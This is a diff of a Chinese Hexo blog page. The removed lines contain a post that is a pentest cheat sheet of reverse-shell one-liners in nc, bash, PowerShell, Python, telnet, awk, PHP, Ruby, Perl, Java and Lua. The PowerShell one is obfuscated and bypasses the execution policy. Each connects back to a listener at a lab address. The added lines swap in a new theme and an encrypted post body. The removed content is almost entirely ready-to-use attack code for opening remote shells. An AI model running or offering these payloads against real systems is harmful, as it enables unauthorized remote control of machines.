@@ -1,1163 +1,373 @@
 <!DOCTYPE html>
-
-
-
-
-<html class="theme-next mist" lang="zh-CN">
+<html lang="en">
 <head><meta name="generator" content="Hexo 3.8.0">
-  <meta charset="UTF-8">
+    <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="theme-color" content="#222">
+<meta name="viewport" content="width=device-width, initial-scale=1">
 
+<!--Description-->
 
 
 
+    <meta name="description" content="INTJ!">
 
 
+<!--Author-->
 
 
+<!--Open Graph Title-->
 
-<meta http-equiv="Cache-Control" content="no-transform">
-<meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta property="og:title" content="Linux&amp;Win花式弹shell指南">
 
 
+<!--Open Graph Description-->
 
+    <meta property="og:description" content="INTJ!">
 
 
+<!--Open Graph Site Name-->
+    <meta property="og:site_name" content="t43M!ne">
 
+<!--Type page-->
 
+    <meta property="og:type" content="article">
 
 
+<!--Page Cover-->
 
 
+    <meta property="og:image" content="https://t43wiu6.github.io/img/home-bg.jpg">
 
 
+<meta name="twitter:card" content="summary_large_image">
 
 
 
-  
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
 
+    <meta name="twitter:image" content="https://t43wiu6.github.io/img/home-bg.jpg">
 
 
+<!-- Title -->
 
+<title>Linux&amp;Win花式弹shell指南 - t43M!ne</title>
 
+<!-- Bootstrap Core CSS -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
 
+<!-- Custom CSS -->
+<link rel="stylesheet" href="/css/main.css">
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+<!-- Custom Fonts -->
+<link rel="stylesheet" href="//./css/font-awesome_5.11.0_css_all.min.css">
+<link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
 
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+<script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+<script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
 
+<!-- Gallery -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/featherlight@1.4.0/src/featherlight.css" integrity="sha256-30DV/STftlyQ6v8yaOWlabammvCYtRJERLj/m0b3zno=" crossorigin="anonymous">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/css/lightgallery.min.css">
 
+<!-- favicon -->
 
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.ico?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.ico?v=5.1.4">
-
-
-  <link rel="mask-icon" href="/images/logo.ico?v=5.1.4" color="#222">
-
-
-
-
-
-  <meta name="keywords" content="Hexo, NexT">
-
-
-
-
-
-  <link rel="alternate" href="/atom.xml" title="不如茶酒伴" type="application/atom+xml">
-
-
-
-
-
-
-<meta name="description" content="NCnc -lvvp 6666 nc -e /bin/sh 192.168.220.140 6666 Bash">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Linux&amp;Win花式弹shell指南">
-<meta property="og:url" content="https://t43wiu6.github.io/2019/03/26/reverse-shell/index.html">
-<meta property="og:site_name" content="不如茶酒伴">
-<meta property="og:description" content="NCnc -lvvp 6666 nc -e /bin/sh 192.168.220.140 6666 Bash">
-<meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-04-13T08:04:20.765Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Linux&amp;Win花式弹shell指南">
-<meta name="twitter:description" content="NCnc -lvvp 6666 nc -e /bin/sh 192.168.220.140 6666 Bash">
-
-
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Mist',
-    version: '5.1.4',
-    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    duoshuo: {
-      userId: '0',
-      author: 'Author'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-
-  <link rel="canonical" href="https://t43wiu6.github.io/2019/03/26/reverse-shell/">
-
-
-
-
-
-  <title>Linux&Win花式弹shell指南 | 不如茶酒伴</title>
-  
-
-
-
-
-
+<link rel="icon" href="/img/logo.ico">
 
 
 
 </head>
+<!-- Head tag -->
 
-<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+<body>
 
-  
-  
-    
-  
-
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">不如茶酒伴</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top bg-transparent position-absolute w-100 p-0" id="nav">
+    <div class="container pl-0 pr-0">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <a class="navbar-brand text-white p-1 pl-3" href="/">t43M!ne</a>
+        </div>
+        <div class="navbar-nav float-right">
+            <button class="btn btn-link search-btn navbar-item" data-toggle="modal" data-target="#searchModal">
+                <i class="fas fa-search"></i>
+            </button>
+        </div>
     </div>
-      
-        <p class="site-subtitle">大风起兮！</p>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
-        
-        <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
-            
-            Home
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-about">
-          <a href="/about/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
-            
-            About
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-tags">
-          <a href="/tags/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
-            
-            Tags
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-categories">
-          <a href="/categories/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
-            
-            Categories
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
-            
-            Archives
-          </a>
-        </li>
-      
-
-      
-        <li class="menu-item menu-item-search">
-          
-            <a href="javascript:;" class="popup-trigger">
-          
-            
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
-            
-            Search
-          </a>
-        </li>
-      
-    </ul>
-  
-
-  
-    <div class="site-search">
-      
-  <div class="popup search-popup local-search-popup">
-  <div class="local-search-header clearfix">
-    <span class="search-icon">
-      <i class="fa fa-search"></i>
-    </span>
-    <span class="popup-btn-close">
-      <i class="fa fa-times-circle"></i>
-    </span>
-    <div class="local-search-input-wrapper">
-      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
-    </div>
-  </div>
-  <div id="local-search-result"></div>
-</div>
-
-
-
-    </div>
-  
+    <!-- /.container -->
 </nav>
 
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
 
+<header class="intro-header" style="background-image: url('/img/home-bg.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12 col-md-12 text-center">
+                <div class="post-heading text-white">
+                    <h1>Linux&Win花式弹shell指南</h1>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
 
- </div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://t43wiu6.github.io/2019/03/26/reverse-shell/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="t43wiu6">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="不如茶酒伴">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">Linux&Win花式弹shell指南</h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-26T16:58:40-07:00">
-                三月 27,2019
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Main Content -->
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
                 
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
+                    <span class="meta d-inline-block">
     
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        <h2 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.220.140 6666</span><br></pre></td></tr></table></figure>
-<h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><a id="more"></a>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.220.140/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<h2 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -ep bypass -Command <span class="string">"<span class="variable">$RcvLFCUFMmdDX</span>='192.168.220.140';<span class="variable">$eGdTwRr</span>=6666;<span class="variable">$aPjzrf</span>=New-Object System.Net.Sockets.TCPClient(<span class="variable">$RcvLFCUFMmdDX</span>,<span class="variable">$eGdTwRr</span>);<span class="variable">$ADWDNku</span>=<span class="variable">$aPjzrf</span>.GetStream();[byte[]]<span class="variable">$mvkwuYHrYO</span>=0..65535|%&#123;0&#125;;<span class="variable">$QPQlsQKzygeCwFV</span>=([text.encoding]::ASCII).GetBytes('PS '+(Get-Location).Path+'&gt; ');<span class="variable">$ADWDNku</span>.Write(<span class="variable">$QPQlsQKzygeCwFV</span>,0,<span class="variable">$QPQlsQKzygeCwFV</span>.Length);while((<span class="variable">$KCaBvR</span>=<span class="variable">$ADWDNku</span>.Read(<span class="variable">$mvkwuYHrYO</span>,0,<span class="variable">$mvkwuYHrYO</span>.Length)) -ne 0)&#123;<span class="variable">$anSGyc</span>=([text.encoding]::ASCII).GetString(<span class="variable">$mvkwuYHrYO</span>,0,<span class="variable">$KCaBvR</span>);try&#123;<span class="variable">$gRrnhEIMpeoP</span>=(Invoke-Expression -c <span class="variable">$anSGyc</span> 2&gt;&amp;1|Out-String)&#125;catch&#123;Write-Warning 'Something went wrong with execution of command on the target.';Write-Error <span class="variable">$_</span>;&#125;;<span class="variable">$RcvLFCUFMmdDX0</span>=<span class="variable">$gRrnhEIMpeoP</span>+'PS '+(Get-Location).Path+'&gt; ';<span class="variable">$RcvLFCUFMmdDX1</span>=(<span class="variable">$RcvLFCUFMmdDX2</span>[0]|Out-String);<span class="variable">$RcvLFCUFMmdDX2</span>.clear();<span class="variable">$RcvLFCUFMmdDX0</span>=<span class="variable">$RcvLFCUFMmdDX0</span>+<span class="variable">$RcvLFCUFMmdDX1</span>;<span class="variable">$QPQlsQKzygeCwFV</span>=([text.encoding]::ASCII).GetBytes(<span class="variable">$RcvLFCUFMmdDX0</span>);<span class="variable">$ADWDNku</span>.Write(<span class="variable">$QPQlsQKzygeCwFV</span>,0,<span class="variable">$QPQlsQKzygeCwFV</span>.Length);<span class="variable">$ADWDNku</span>.Flush();&#125;;<span class="variable">$aPjzrf</span>.Close();if(<span class="variable">$RcvLFCUFMmdDX3</span>)&#123;<span class="variable">$RcvLFCUFMmdDX3</span>.Stop();&#125;;"</span></span><br></pre></td></tr></table></figure>
-<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><blockquote>
-<p><strong>TCP</strong></p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">"import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.220.140',6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('/bin/bash');s.close();"</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.220.140",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p><strong>UDP</strong><br>ps:<code>nc -luvvp 6666</code></p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">"import os;import pty;import socket;soc=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);soc.connect(('192.168.220.140',6666));os.dup2(soc.fileno(),0);os.dup2(soc.fileno(),1);os.dup2(soc.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('/bin/bash');soc.close();"</span></span><br></pre></td></tr></table></figure>
-<h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">telnet 192.168.220.131 6666 | /bin/bash | telnet 192.168.220.131 6665</span><br><span class="line">nc -lvvp 6666 <span class="comment">#命令传输窗口</span></span><br><span class="line">nc -lvvp 6665 <span class="comment">#命令结果显示窗口</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ -e /tmp/<span class="built_in">test</span> ];<span class="keyword">then</span> rm /tmp/<span class="built_in">test</span>;<span class="keyword">fi</span>;mkfifo /tmp/<span class="built_in">test</span>;cat /tmp/<span class="built_in">test</span>|/bin/sh -i 2&gt;&amp;1|telnet 192.168.220.140 6666 &gt; /tmp/<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ -e /tmp/<span class="built_in">test</span> ];<span class="keyword">then</span> rm /tmp/<span class="built_in">test</span>;<span class="keyword">fi</span>;mknod /tmp/<span class="built_in">test</span> p &amp;&amp; telnet 192.168.220.140 6666 0&lt;/tmp/<span class="built_in">test</span>|/bin/bash 1&gt;/tmp/<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
-<h2 id="AWK"><a href="#AWK" class="headerlink" title="AWK"></a>AWK</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">p=6666;awk -v port=<span class="string">"<span class="variable">$p</span>"</span> <span class="string">'BEGIN&#123;soc="/inet/tcp/0/192.168.220.140/"port;while(8095856)&#123;do&#123;printf "shell&gt;"|&amp;soc;soc|&amp; getline inp;if(inp)&#123;while((inp|&amp; getline)&gt;0)print $0|&amp;soc;close(inp);&#125;&#125;while(inp!="exit")close(soc);break&#125;&#125;'</span> /dev/null</span><br></pre></td></tr></table></figure>
-<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">"\$soc=fsockopen('192.168.220.140',6666);exec('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sock = fsockopen(<span class="string">'192.168.220.131'</span>, <span class="number">6666</span>);</span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">      <span class="number">0</span> =&gt; $sock,</span><br><span class="line">      <span class="number">1</span> =&gt; $sock,</span><br><span class="line">      <span class="number">2</span> =&gt; $sock</span><br><span class="line"> );</span><br><span class="line"> $process = proc_open(<span class="string">'/bin/sh'</span>, $descriptorspec, $pipes);</span><br><span class="line"> proc_close($process);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'f=TCPSocket.open("192.168.220.131",6666).to_i;exec &gt; sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">"exit if fork;soc=TCPSocket.new('192.168.220.140',6666);while(soc.print 'shell&gt;';cmd=soc.gets);IO.popen(cmd,'r')&#123;|io|soc.print io.read&#125;end"</span></span><br></pre></td></tr></table></figure>
-<h2 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h2><blockquote>
-<p><strong>TCP</strong></p>
-</blockquote>
-<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -MSocket -e <span class="string">"\$i='192.168.220.140';\$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$p,inet_aton(\$i))))&#123;open(STDIN,'&gt;&amp;S');open(STDOUT,'&gt;&amp;S');open(STDERR,'&gt;&amp;S');exec('/bin/sh -i');&#125;;"</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -MIO::Socket::INET -e <span class="string">"exit,if(fork);\$soc=new IO::Socket::INET(PeerAddr,'192.168.220.140:'.6666);\$soc-&gt;send('shell&gt;');STDIN-&gt;fdopen(\$soc,r);$~-&gt;fdopen(\$soc,w);system\$_ while&lt;&gt;;"</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p><strong>UDP</strong><br>ps:<code>nc -luvvp</code></p>
-</blockquote>
-<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -MIO::Socket::INET -e <span class="string">'$|=1;$soc = new IO::Socket::INET(PeerAddr =&gt; "192.168.220.140:".6666,Proto =&gt; "udp");while(1)&#123;$soc-send("shell&gt;");$soc-&gt;recv($inp,1024);$h=$soc-&gt;peerhost();$p=$soc-peerport();$d=qx($inp);$soc-&gt;send($d);&#125;'</span></span><br></pre></td></tr></table></figure>
-<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;);</span><br><span class="line">p.waitFor();</span><br></pre></td></tr></table></figure>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"</span>&#125;);</span><br><span class="line">p.waitFor();</span><br></pre></td></tr></table></figure>
-<h2 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h2><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('192.168.220.131','6666');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure>
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <div>
-      
-        <div>
-    
-        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束,感谢您的阅读-------------</div>
-    
-</div>
-      
-    </div>
-    
-    <footer class="post-footer">
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2019/03/23/DC-1/" rel="next" title="渗透实战:DC-1靶机入侵">
-                <i class="fa fa-chevron-left"></i> 渗透实战:DC-1靶机入侵
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/04/19/Typhoon/" rel="prev" title="渗透实战:Typhoon靶机入侵">
-                渗透实战:Typhoon靶机入侵 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-
-    <div class="post-spread">
-      
-    </div>
-  </div>
-
-
-          </div>
-          
-
-
-          
-
-  
-
-
-
-        </div>
+        <i class="far fa-bookmark fa-fw"></i>
         
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
 
-  <aside id="sidebar" class="sidebar">
+<a href="/categories/Pentest/">Pentest</a>
+
     
-    <div class="sidebar-inner">
+    
+    <!-- Date -->
+    
+        <span class="post-meta-split">&nbsp;|&nbsp;</span>
+        <i class="far fa-calendar-check fa-fw"></i>
+        March 26,2019
+    
+    <!-- word count and read count -->
+    
 
-      
+    
 
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Overview
-          </li>
+    
+</span>  
+                
+                <div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="Hey, password is required here."><label>Hey, password is required here.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="a525d9341bf3259dc7f34b8de661097bb1592efd5f34ae0893b51182ee60cf05">077da7ed3ff7dfe07bf6b44a002da631e146ca34f8a55d37521bbc3497b023f3b57940ad5bbdb0b425d2d279e58d5dae8c5f12a26348e7986c944200e7756dbcc090839d1a4c4398cbb37f16e64d7b300b6391b7e889824ad5f2dcd6f90f6276a5d55a82762ba7099d399c4954d8120080b02c1dfa250a84900b3f9ddda1e0fe203f3894d0a8301365bb4fc0cfa46877ebb7ec4b448bc52f1add0415941a76adc4feb52e295015f30e17b6cf3789c0aafedf8af6ee87c62c3778d83c4f66ba1e91193340dccb5af703847ac09ffb94bcfbefae579ca49a97aebcd2eb97d606406779ea98787e564eed76760cc32927bf8fd4e4b85c1eef5accf6b82e5ada077a33745d63aa50707e39f9ffa51ebd577d498c16bb2f4bd8977d079a7491f73840c290b7ffdf709203ecc8be526dd0d2c6c443cea0cc230968ab14dbcaec089a22b1bd8afedc046c0e7bdabb099484528fda0b8a812485ab1023e4e59b4c9a938ff6ca33bf23bb5267bb509292148e42896732cc11563d5bcd0529f8297e66daadc3dcaf03b8ccd797762ce9395b2d8e50c1b6d2abc316a61149456ae06e4c958ab7e0b0556454df8c4a0c52d8e4cb9e72b3daf46078d5e7f9ed131bd02a16c2a506de148aaee9c4b2c64ff0717cc1af567485ccbb16444c49b5a339b7cc98502e4d84885d537aaa51f0ab78d28ad7a5fe8ccd56e36e402ca33d1090ba36aa807e589a2998bb21669c4626633f4416511c4a5fa47d0ea1cd7e0f89be4d2f7d5fc06d12eec8b5b918aececfa5e502a8b11a2127361dd54e4a676cd01628648cd4029541a2635dedf9378f0039c5fc0ace2d54a2e2814dd5cf86cd6e1407f3dfccebb008c3ad5010a831d9be2ca3c5f042831e3b979ab0dd5f20e3d97bc445ea57c9171426945cca7ac7514a07ca6dd5da90c28dd5abf905ab06ef5415c336d7cc43c9aa870952d48f911d2b7f83283dace904cfb4513ded6e47cd5e3f180b6d64de205532b5c736a4255dde2fb60ecf78aaa32cd984fd38b63b6858212b06b383df11e1d3e1e23c1bec4eea17a74ee2b52bd93846eb209e41e35e83fc4c4683414d1414b4667f2d9153f5d420c1d831c18efe86058c80777e47d2e472c3a8cb17397636bff3fd27e275a28f33c258828988f512a822fa5977c6004034055b9b6c43e94db030635beef28676ec5b159417a6070f1c94d268f12ce0756ae8e27dfbedc8e3cde658891a41d420b2f7932b387ff51c0b42dd33a30ca23a2b7a26ca345a4aaf6afdf093c2616189b31a1aa831df6f99b6ed5b0325f6b2613d726308953bf37631b8cd98f2b5c6354829a60e20557bcd83d03e23d8b70dae7b54bbaa567e90c05673f6ab25764b261a02605bdc55bab6a6b80b39d0bb5ae1806935b98b2f45306b85b26dc437bf7666e21134102956a03041a538068a9115120368e9b0844a5f45d73d062d9fced9d09a950b66aa812678d541018f355ce7d08a03a2e24525e82e94de3abfb586ea8efa4d200f6a2eee5c003ffe2dff7fcdcd7d50b2741c07d0623dcf3767be9ed8ebf013c96787441f95ef6d7d65272ea0844d6f7a83d7b6453acc4ec290a0500598504360377258147e30be6229653fb14a19e46f7823949cf360952ddc94b0511a3e08ba902520c73d27dd3413fd5c5e357d864e74b6d81044a84965f834a1e451062a45474fc655009070c4772afa72b9d0751ed224b89598e7ff0a81a30d37c52c062fd6ccbda0c041c159c2a6fbf57c2597b9378be867e69f71acc219a5038706dcb373d707db2ab0b5eed74e589dda5aaf1f1c912980ebe9e1ea5485b2cd32d7ebca44daf0ac2bb3733139eb4e772919454aa19673f100e0d10181dcb67ec5c10bbd1b181f7d9bbe44bf27df8c69b3f4d4aefaa97fb17e45bba4f4ca0e653bd3f87139a1bf59043fcf72f0b6c50fbd4f78e3c3d25fd277061a20dc30a80e969b423a72597e5e812a104ebd338b44e442c37e4065e24ca5c4b9daa655e4cc5c3a1eb334a9460b1e35b79275909d643a488ac1c64eb452726b8817571e402c4b1063838e610bed87507a1d1d16ee9dbdd122e4b46d026e0851e9b7821c25385927787952ec7a74203253ee02b2645b616b710f67064d18554d3b5510b020d24692e69185ef3766b5fe4a4a7a9ef868293650ac6b4a421009f6ec534e7e9299cfb811157d9401d23783d3536a5f37594e2e037d9bab47ac19d4778b014cdbaa25f1fc419f95097ae8728e8ec5d28ba9e1aa8d3dfba9b94a4ed35cc17e3ba452fcd23e7a1ac6ca3b69e418c565bd19ba0fb7ae45a7fdb5f60bfc1745b4ee2dcabc894f2e6c58976bf9cd5c4214037d49973de761b3d780c808855e6614697c6df04ba39a1734f0163bc9d4191ddd365a2834775596035576938ddbe2db3edadcc38fb3332b023331896bc77cffc9683df22d31e094a05f2d22115d41033a08b185433074473d644c19b27d87716f231a9e28e5767cb6f813fc2ba67912bb643ad4a7f2ea3bff9dc9eb4574b6ea74004e6902f0da986dfeb9a2679a10aa2b7365f349d9d26e557a0328457d571f3d04b8e02fde3380bf99c80eba7fc9270731f78fb3b9d4c024021553cf1f6a2e055942e49d28345de37601de959f433081a81089aed00f3575fe307cd7cb5dda62e77dfb11a2db3cd333689a3a70ed7541a3aa70b26c8c7d7ef025fc352db6532ecb8b7d4081b52b46b37ddbc07a8cd0c86b0176e56357f156642a6e7075ee53f0d3eb3f4698053c5957b374b686ec1596a1161877cb